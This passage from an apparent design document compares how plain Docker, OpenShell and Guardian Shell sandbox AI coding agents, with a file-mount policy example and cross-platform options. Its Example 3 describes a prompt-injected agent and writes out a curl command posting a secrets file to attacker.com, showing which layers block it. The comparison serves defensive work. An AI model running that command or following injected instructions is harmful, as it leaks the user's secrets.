### Example 3: Agent Tries to Exfiltrate — Three Outcomes

```
Attack: Agent is prompt-injected to send /workspace/secrets.env to attacker.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PLAIN DOCKER:
  curl -X POST https://attacker.com/steal -d @/workspace/secrets.env
  → File read: SUCCESS (no Landlock)
  → Network: SUCCESS (no proxy, no policy)
  → Exfiltration: COMPLETE
  → Detection: NONE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OPENSHELL:
  curl -X POST https://attacker.com/steal -d @/workspace/secrets.env
  → File read: Depends on Landlock config
    If secrets.env in allowed paths: read succeeds
    If not: EACCES
  → Network: Proxy intercepts
    OPA check: attacker.com not in policy → DENY (403)
  → Exfiltration: BLOCKED
  → Detection: Proxy logs the attempt with binary identity
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GUARDIAN SHELL (native Linux):
  curl -X POST https://attacker.com/steal -d @/workspace/secrets.env
  → File read: Landlock check (inode-based)
  → Exec: eBPF bprm_check_security on curl
  → Network: eBPF sys_enter_connect + LSM socket_connect
  → If any layer denies: BLOCKED
  → Detection: Real-time event stream + Slack/webhook alert
  → Human-in-the-loop: Interactive permission if configured
  → Audit: SQLite trail with full metadata
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Example 4: Mounting Multiple Mac Folders

```bash
# You need the agent to access:
#   ~/projects/webapp/       (read-write, the workspace)
#   ~/projects/shared-lib/   (read-only, a dependency)
#   ~/Documents/spec.pdf     (read-only, reference doc)
#
# But NOT:
#   ~/projects/secret-project/
#   ~/Documents/taxes.pdf
#   ~/Desktop/
#   Anything else

# OpenShell approach:
# Policy: coding-agent.yaml
filesystem_policy:
  read_write:
    - /workspace
  read_only:
    - /shared-lib
    - /docs/spec.pdf
    - /usr/lib
    - /etc/resolv.conf

# Launch:
openshell sandbox create \
  --mount ~/projects/webapp:/workspace \
  --mount ~/projects/shared-lib:/shared-lib:ro \
  --mount ~/Documents/spec.pdf:/docs/spec.pdf:ro \
  --policy coding-agent.yaml

# Result:
# ✓ /workspace — read-write (Docker mount + Landlock allows)
# ✓ /shared-lib — read-only (Docker mount :ro + Landlock read_only)
# ✓ /docs/spec.pdf — read-only (Docker mount :ro + Landlock read_only)
# ✗ ~/projects/secret-project/ — invisible (not mounted)
# ✗ ~/Documents/taxes.pdf — invisible (not mounted)
# ✗ ~/Desktop/ — invisible (not mounted)
#
# TWO layers of protection:
#   Layer 1 (Docker mount): secret-project, taxes.pdf, Desktop not visible
#   Layer 2 (Landlock): even within visible files, read-only enforced
```

---

## 12. Implications for Guardian Shell

### Current State

Guardian Shell runs natively on Linux only. No VM, no Docker, no performance tax.
This is its strength on Linux — and its limitation for macOS/Windows users.

### Cross-Platform Options

```
Option A: Docker container (Phase 13f in implementation plan)
  Same approach as OpenShell — put Guardian Shell in Docker.
  eBPF + Landlock run inside Docker Desktop's Linux VM.

  Pros: Works on macOS/Windows. Single command to start.
  Cons: Requires --privileged. File I/O tax. eBPF may need
        specific kernel config in LinuxKit.

Option B: Native Linux only (current approach)
  Stay Linux-only. Accept that macOS/Windows developers can't use it.

  Pros: Best performance. Simplest architecture. No Docker dependency.
  Cons: Excludes most developers.

Option C: Hybrid — remote Guardian Shell
  Guardian Shell runs on a Linux server. Developer accesses it
  remotely via SSH tunnel or web dashboard.

  Pros: No Docker overhead. Full kernel feature access.
  Cons: Requires Linux server. Network latency for file sync.
```

### Key Takeaway

**Cross-platform Linux security tools don't exist. Cross-platform Docker wrappers
around Linux security tools exist.** Both OpenShell and Guardian Shell (if
containerized) face the same fundamental trade-off: security enforcement happens
inside a Linux VM, not on the host OS. The host OS is protected only by what you
choose to mount into the VM.

For production servers (Linux), Guardian Shell's native approach is superior.
For developer workstations (macOS/Windows), the Docker wrapper is the only viable
path, and OpenShell has already solved the engineering challenges of making it
work reliably.

---

*Last updated: 2026-03-25*
